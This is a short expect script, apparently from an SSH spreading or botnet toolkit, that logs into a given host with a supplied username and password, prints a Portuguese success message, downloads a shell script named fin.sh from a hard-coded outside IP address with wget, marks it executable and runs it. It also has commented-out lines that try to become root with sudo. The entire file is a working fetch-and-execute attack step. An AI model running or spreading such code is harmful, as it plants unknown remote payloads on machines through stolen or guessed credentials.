#!/usr/bin/expect -f
set user [lindex $argv 0]
set ip [lindex $argv 1]
set password [lindex $argv 2]
spawn ssh $user@$ip
expect "*ssword: " { send "$password\r" }
#sleep 1
#expect "*:*" { send "sudo su\n" }
#expect "*:*" { send "$password\r "}
sleep 1
send "echo Logado com sucesso!\n"
send "wget 167.99.9.54/fin.sh\n"
expect "*:*" {send "chmod +x fin.sh\n"}
send "./fin.sh\n"
interact
